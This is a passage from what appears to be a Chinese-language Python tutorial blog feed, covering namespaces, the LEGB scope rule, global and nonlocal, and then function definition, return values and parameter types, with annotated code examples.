<span class="comment"># &lt;built-in function input&gt; &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="comment"># input和int本应属于内置名称空间，但由于自行定义所以全局名称空间也有了</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    input = <span class="number">444</span></span><br><span class="line">    print(input) <span class="comment"># 444 站在局部名称空间,局部空间有则使用局部</span></span><br><span class="line">    print(int) <span class="comment"># 111 局部空间没有，则查找全局空间</span></span><br><span class="line">input = <span class="number">333</span></span><br><span class="line">int = <span class="number">111</span></span><br><span class="line">print(input) <span class="comment"># 333 站在全局名称空间</span></span><br><span class="line">func() <span class="comment"># 定义只是开辟空间，调用时input和int已经被自行定义了</span></span><br></pre></td></tr></table></figure><h2 id="名称空间的’嵌套关系’"><a href="#名称空间的’嵌套关系’" class="headerlink" title="名称空间的’嵌套关系’"></a>名称空间的’嵌套关系’</h2><h3 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    print(x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    func()</span><br><span class="line">foo() <span class="comment"># 1</span></span><br></pre></td></tr></table></figure><p>调用无法导致名称空间的嵌套关系，在当前局部名称空间找不到，就会直接去找全局名称空间</p><h3 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># f2的名称空间在f1里面</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>():</span></span><br><span class="line">    x = <span class="number">111</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f2</span>():</span> <span class="comment"># f2找不到就往上一层f1进行查找</span></span><br><span class="line">        print(x)</span><br><span class="line">    f2()</span><br><span class="line">f1() <span class="comment"># 111</span></span><br></pre></td></tr></table></figure><p>函数的嵌套是在<strong>定义阶段</strong>决定的，即检测语法的时候确定的</p><p><strong>实例3</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">111</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    print(x)</span><br><span class="line">    x = <span class="number">222</span></span><br><span class="line">func() <span class="comment"># 报错：local variable &#x27;x&#x27; referenced before assignment</span></span><br></pre></td></tr></table></figure><p>结果报错</p><p>上文提到，函数的嵌套是在<strong>函数定义阶段</strong>决定的，所以函数定义时func()的局部名称空间知道有x，而定义时<strong>只检查代码而不运行代码</strong>，而调用时就不会再往上一层查找，程序运行到print(x)，局部空间内还没有定义x，所以报错</p><h2 id="名称空间的约定沟通方式"><a href="#名称空间的约定沟通方式" class="headerlink" title="名称空间的约定沟通方式"></a>名称空间的约定沟通方式</h2><p>由于名称空间存在嵌套的可能，所以某些程序员前辈就巧妙地对嵌套名词空间进行了LEGB命名(<strong>非语法，只是约定俗成</strong>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># b Builtin 内置名称空间</span></span><br><span class="line"><span class="comment"># g global 全局名称空间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>():</span></span><br><span class="line">    <span class="comment"># e enclosing_function_locals 外部嵌套函数名称空间</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f2</span>():</span></span><br><span class="line">        <span class="comment"># e enclosing_function_locals 外部嵌套函数名称空间</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">f3</span>():</span></span><br><span class="line">            <span class="keyword">pass</span> <span class="comment"># l local 函数内本地名称空间</span></span><br></pre></td></tr></table></figure><hr><h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p>作用域简单理解就是作用范围，他其实就是把名称空间归位了两大类</p><h2 id="全局作用域"><a href="#全局作用域" class="headerlink" title="全局作用域"></a>全局作用域</h2><p>全局作用域:位于全局名称空间、内建名称空间中的名字属于全局范围，该范围内的名字全局存活(除非被删除，否则在整个文件执行过程中存活)、全局有效(在任意位置都可以使用)</p><h2 id="局部作用域"><a href="#局部作用域" class="headerlink" title="局部作用域"></a>局部作用域</h2><p>局部作用域:位于局部名称空间中的名字属于局部范围。该范围内的名字临时存活(即在函数调用时临时生成，函数调用结束后就释放)、局部有效(只能在所在函数内使用</p><h2 id="global函数内定义全局变量"><a href="#global函数内定义全局变量" class="headerlink" title="global函数内定义全局变量"></a>global函数内定义全局变量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">111</span></span><br><span class="line">y = <span class="number">222</span></span><br><span class="line">z = [<span class="number">111</span>,<span class="number">222</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="keyword">global</span> y <span class="comment"># y是全局变量</span></span><br><span class="line">    x = <span class="number">333</span></span><br><span class="line">    y = <span class="number">444</span></span><br><span class="line">    z.append(<span class="number">333</span>) <span class="comment"># z是可变类型，修改z内值不会导致z对应新的内存地址，函数内可以直接修改全局列表</span></span><br><span class="line">func()</span><br><span class="line">print(<span class="string">&#x27;x=&#123;&#125;,y=&#123;&#125;&#x27;</span>.format(x,y)) <span class="comment"># x=111,y=444</span></span><br><span class="line">print(z) <span class="comment"># [111, 222, 333]</span></span><br></pre></td></tr></table></figure><p>在函数体内通过global定义的变量不再是函数体的局部变量，而是全局变量</p><h2 id="nonlocal修改外层函数名字对应的值"><a href="#nonlocal修改外层函数名字对应的值" class="headerlink" title="nonlocal修改外层函数名字对应的值"></a>nonlocal修改外层函数名字对应的值</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">111</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>():</span></span><br><span class="line">    x = <span class="number">222</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f2</span>():</span></span><br><span class="line">        x = <span class="number">333</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">f3</span>():</span></span><br><span class="line">            <span class="keyword">nonlocal</span> x</span><br><span class="line">            x = <span class="number">444</span></span><br><span class="line">        f3()</span><br><span class="line">        print(<span class="string">&#x27;f2的x = &#123;&#125;&#x27;</span>.format(x))</span><br><span class="line">    f2()</span><br><span class="line">    print(<span class="string">&#x27;f1的x = &#123;&#125;&#x27;</span>.format(x))</span><br><span class="line">f1()</span><br><span class="line">print(<span class="string">&#x27;全局变量的x = &#123;&#125;&#x27;</span>.format(x))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">f2的x = 444</span></span><br><span class="line"><span class="string">f1的x = 222</span></span><br><span class="line"><span class="string">全局变量的x = 111</span></span><br><span class="line"><span class="string">f3修改了f2的x</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>nonlocal以当前层向外层寻找x，找到了即进行修改，如果函数内都没有则报错(永远不会修改全局函数)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">111</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>():</span></span><br><span class="line">    x = <span class="number">222</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f2</span>():</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">f3</span>():</span></span><br><span class="line">            <span class="keyword">nonlocal</span> x</span><br><span class="line">            x = <span class="number">444</span></span><br><span class="line">        f3()</span><br><span class="line">    f2()</span><br><span class="line">    print(<span class="string">&#x27;f1的x = &#123;&#125;&#x27;</span>.format(x))</span><br><span class="line">f1()</span><br><span class="line">print(<span class="string">&#x27;全局变量的x = &#123;&#125;&#x27;</span>.format(x))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">f1的x = 444</span></span><br><span class="line"><span class="string">全局变量的x = 111</span></span><br><span class="line"><span class="string">由于f2没有x，所以，f3的nonlocal直接修改到了f1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>17.python函数的基本使用</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/17.python%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/17.python%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>其实函数我们在之前就已经接触过了，输入输出的<code>input\print</code>，类型转换的<code>int\bool</code>等等很多很多，他们都是具有一定的功能。</p><p>简单理解，函数就是一个个的功能模块，他的作用其实很容易理解，我们写的程序会越来越复杂、功能越来越多，但是很多时候需要重复使用一些功能代码，函数其实就是将这些功能代码封装起来做成工具</p><p>以<code>print</code>函数为例，我们可能会在一个程序中大量使用<code>print</code>，如果每用一次就完整书写一次<code>print</code>内部代码，就会导致代码非常臃肿，组织结构不清晰，可读性差，这个叫做<strong>代码冗余</strong>，而且如果要对程序的print进行修改，我们还需要修改代码中每一个使用了这个功能的代码，就会导致<strong>可维护性、扩展性差</strong></p><a id="more"></a><hr><h1 id="函数基础"><a href="#函数基础" class="headerlink" title="函数基础"></a>函数基础</h1><p>函数分为两个大类，我们之前接触到可以直接使用的函数，其实是python解释器提前定义好的，称为<strong>内置函数</strong>，但是内置函数只提供了基本的功能。而很多功能需要我们自己定义成函数，这种叫做自定义函数</p><p>函数的使用必须遵循<strong>先定义，后调用</strong>的原则。</p><p>函数的定义就相当于事先将函数体代码保存起来，然后将内存地址赋值给函数名，函数名就是对这段代码的引用，这类似于变量的定义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> 函数名(<span class="params">参数<span class="number">1</span>,参数<span class="number">2</span>,...</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;文档描述&quot;&quot;&quot;</span></span><br><span class="line">    函数体</span><br><span class="line">    <span class="keyword">return</span> 值</span><br></pre></td></tr></table></figure><ul><li><p>def: 定义函数的关键字</p></li><li><p>函数名：函数名指向函数内存地址，是对函数体代码的引用。函数的命名应该反映出函数的功能</p></li><li><p>括号：括号内定义参数，<strong>参数是可有可无的</strong>，且无需指定参数的类型</p></li><li><p>冒号：括号后要加冒号，然后在下一行开始缩进编写函数体的代码</p></li><li><p>“””文档描述”””: 描述函数功能，参数介绍等信息的文档，<strong>文档描述是可有可无的</strong>，但是建议加上，从而增强函数的可读性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看文档描述</span></span><br><span class="line">print(help(函数名))</span><br></pre></td></tr></table></figure></li><li><p>函数体：由语句和表达式组成</p></li><li><p>return 值：定义函数的返回值，*<strong>返回值是可有可无的</strong></p></li></ul><h2 id="定义与调用函数发生的事情"><a href="#定义与调用函数发生的事情" class="headerlink" title="定义与调用函数发生的事情"></a>定义与调用函数发生的事情</h2><h3 id="定义函数发生的事情"><a href="#定义函数发生的事情" class="headerlink" title="定义函数发生的事情"></a>定义函数发生的事情</h3><ol><li>申请内存空间保存函数体代码</li><li>将上述内存地址绑定给函数名</li><li>定义函数不会执行函数体代码，但是会检测函数体语法</li></ol><h3 id="调用函数发生的事情"><a href="#调用函数发生的事情" class="headerlink" title="调用函数发生的事情"></a>调用函数发生的事情</h3><ol><li>通过函数名找到函数的内存地址</li><li>然后加括号就是再触发函数体代码的运行</li></ol><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 函数名的命名规范与变量名类似</span></span><br><span class="line"><span class="comment"># 函数名的命名风格推荐小写加下划线，但函数是工具，最好是动词而不是名词</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 形式一:无参函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">interactive</span>():</span></span><br><span class="line">    name = input(<span class="string">&#x27;username&gt;&gt;&gt;:&#x27;</span>) <span class="comment"># 这里是函数体内接受用户输入</span></span><br><span class="line">    age = input(<span class="string">&#x27;age&gt;&gt;&gt;:&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;名字：&#123;&#125;,年龄：&#123;&#125;&#x27;</span>.format(name,age))</span><br><span class="line">interactive() <span class="comment"># 直接函数名调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 形式二：有参函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x,y</span>):</span> <span class="comment"># 接收参数的值可以被函数体所使用</span></span><br><span class="line">    c = x + y</span><br><span class="line">    <span class="keyword">return</span> c <span class="comment"># return着返回值</span></span><br><span class="line">result = add(<span class="number">10</span>,<span class="number">20</span>) <span class="comment"># 外部接收返回值</span></span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 形式三：空函数,函数体代码为pass的函数被称为空函数</span></span><br><span class="line"><span class="comment"># 空函数常使用在构思代码的时候，将函数体预先写出占位，最好写上注释计划的功能</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;计划做的功能&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>) <span class="comment"># 没有任何执行</span></span><br></pre></td></tr></table></figure><h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    z = x + y</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line"><span class="comment"># 形式一：语句形式 - 只调用函数，不用接收返回值</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>) <span class="comment"># 没有任何返回值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 形式二：表达式形式</span></span><br><span class="line">print(add(<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">res = add(<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">res = add(<span class="number">3</span>,<span class="number">3</span>) * <span class="number">12</span></span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 形式三：函数调用作为参数</span></span><br><span class="line">res = add(add(<span class="number">1</span>,<span class="number">2</span>),<span class="number">3</span>) <span class="comment"># 1+2+3</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><h2 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h2><p><code>return</code>是函数体结束的标志，即函数体代码一旦运行到return就会立即终止函数的运行，并且会将<code>return</code>后的值当成结果返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 没有返回值:返回None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    z = x + y</span><br><span class="line">    <span class="keyword">return</span> <span class="comment"># 函数内没有return也是返回None</span></span><br><span class="line">print(add(<span class="number">1</span>,<span class="number">2</span>)) <span class="comment"># None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回一个值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    z = x + y</span><br><span class="line">    <span class="keyword">return</span> z <span class="comment"># 函数内没有return也是返回None</span></span><br><span class="line">print(add(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回多个值:return用逗号分隔多个值，返回元组</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    z = x + y</span><br><span class="line">    <span class="keyword">return</span> x,y,z <span class="comment"># 函数内没有return也是返回None</span></span><br><span class="line">res = add(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">print(res,type(res)) <span class="comment"># (1, 2, 3) &lt;class &#x27;tuple&#x27;&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h1><p>函数的参数分为形式参数和实际参数，简称形参和实参</p><blockquote><p>引用传递:在python中所有值的传递都不是传递的值本身，而是值的内存地址</p></blockquote><h2 id="形参与实参的关系"><a href="#形参与实参的关系" class="headerlink" title="形参与实参的关系"></a>形参与实参的关系</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x,y为形式参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>) <span class="comment"># 1,2为实际参数</span></span><br></pre></td></tr></table></figure><p>形参：在定义函数阶段定义的参数称为形式参数，相当于变量名</p><p>实参：在调用函数阶段传入的值称为实际参数，相当于变量值</p><p>只要能够得到一个值，都能够作为实参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1：实参是常量</span></span><br><span class="line">res=my_min(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="comment">#2：实参是变量</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">2</span></span><br><span class="line">res=my_min(a,b)</span><br><span class="line"><span class="comment">#3：实参是表达式</span></span><br><span class="line">res=my_min(<span class="number">10</span>*<span class="number">2</span>,<span class="number">10</span>*my_min(<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"><span class="comment">#4：实参可以是常量、变量、表达式的任意组合</span></span><br><span class="line">a=<span class="number">2</span></span><br><span class="line">my_min(<span class="number">1</span>,a,<span class="number">10</span>*my_min(<span class="number">3</span>,<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>在调用阶段，实参(变量值)的内存地址会绑定给形参(变量名)，这种绑定关系只在函数体内使用</p><p>实参与形参的绑定关系在函数调用时生效，函数调用结束后解除绑定关系</p><h2 id="形参与实参的具体使用"><a href="#形参与实参的具体使用" class="headerlink" title="形参与实参的具体使用"></a>形参与实参的具体使用</h2><h3 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h3><p>按从左至右的顺序依次定义的参数称为位置参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 位置形参</span></span><br><span class="line"><span class="comment"># 在函数定义阶段，按照从左至右的顺序直接定义的形参(变量名)</span></span><br><span class="line"><span class="comment"># 特点：必须按照位置被传值，多一个少一个都不行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    print(x,y)</span><br><span class="line"><span class="comment"># 位置实参</span></span><br><span class="line"><span class="comment"># 函数调用阶段，按照从左至右的顺序依次传入的值</span></span><br><span class="line"><span class="comment"># 特点:按照顺序与形参一一对应</span></span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>) <span class="comment"># x=1 y=2</span></span><br><span class="line">func(<span class="number">2</span>,<span class="number">1</span>) <span class="comment"># x=2 y=1</span></span><br></pre></td></tr></table></figure><h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><p>关键字参数指的是关键字实参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在函数调用阶段，按照key=value的形式传值</span></span><br><span class="line"><span class="comment"># 特点:指名道姓给某个形参传值，完全不参照顺序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    print(x,y) <span class="comment"># 1 2</span></span><br><span class="line">func(y=<span class="number">2</span>,x=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位置实参与关键字实参混用</span></span><br><span class="line"><span class="comment"># 位置实参必须放在关键字实参前</span></span><br><span class="line"><span class="comment">## func(y=2,1) # 语法错误</span></span><br><span class="line">func(<span class="number">2</span>,y=<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 不能为同一个形参重复传值</span></span><br><span class="line"><span class="comment">## func(1,y=2,x=3) # 错误</span></span><br><span class="line"><span class="comment">## func(1,x=3) # 错误</span></span><br></pre></td></tr></table></figure><h3 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h3><p>默认参数指的是默认形参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在定义函数阶段，就已经被赋值的形参称为默认形参</span></span><br><span class="line"><span class="comment"># 特点：在定义阶段就已经被赋值意味着在调用阶段可以不赋值</span></span><br><span class="line"><span class="comment"># 位置形参与默认形参混用，强调:位置形参必须在默认形参的左边</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y=<span class="number">3</span></span>):</span></span><br><span class="line">    print(x,y)</span><br><span class="line">func(<span class="number">1</span>) <span class="comment"># 1 3</span></span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>) <span class="comment"># 1 2 # 也可以传值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认参数的值是在定义阶段被赋值的，准确的说是被赋予的是值的内存地址</span></span><br><span class="line"><span class="comment"># 在python中所有值的传递都不是传递的值本身，而是值的内存地址</span></span><br><span class="line"><span class="comment">## 示范一</span></span><br><span class="line">m = <span class="number">2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>(<span class="params">x,y=m</span>):</span> <span class="comment"># m=&gt;2的内存地址 故 y=2的内存地址</span></span><br><span class="line">    print(x,y)</span><br><span class="line">m = <span class="number">3</span> <span class="comment"># m指向了3的内存地址</span></span><br><span class="line">func1(<span class="number">1</span>) <span class="comment"># 1 2</span></span><br><span class="line"><span class="comment">## 示范二</span></span><br><span class="line"><span class="comment"># 虽然默认值可以指定为任意数据类型，但是不推荐使用可变类型</span></span><br><span class="line"><span class="comment"># 函数最理想的状态：函数的调用只跟函数本身有关系，不受外界代码的影响</span></span><br><span class="line">m = [<span class="number">111</span>,<span class="number">222</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>(<span class="params">x,y=m</span>):</span> <span class="comment"># y指向了[111,222]的内存地址</span></span><br><span class="line">    print(x,y)</span><br><span class="line">m.append(<span class="number">333</span>) <span class="comment"># [111,222]的内存地址添加了333</span></span><br><span class="line">func1(<span class="number">1</span>) <span class="comment"># 1 [111, 222, 333]</span></span><br></pre></td></tr></table></figure><h3 id="可变长度参数"><a href="#可变长度参数" class="headerlink" title="可变长度参数"></a>可变长度参数</h3><p>可变长度指的是在调用函数时，传入的值(实参)的个数不固定，针对溢出部分的实参必须要有对应的新参来接收</p><p><strong>可变长度的位置参数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># *形参名：用来接收溢出的位置实参,溢出的位置实参会被*保存成元组然后赋值给*形参名</span></span><br><span class="line"><span class="comment"># *形参名可以是任意名字，但args是默认的规范(推荐使用)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x,y,*args</span>):</span></span><br><span class="line">    print(x,y,args)</span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span 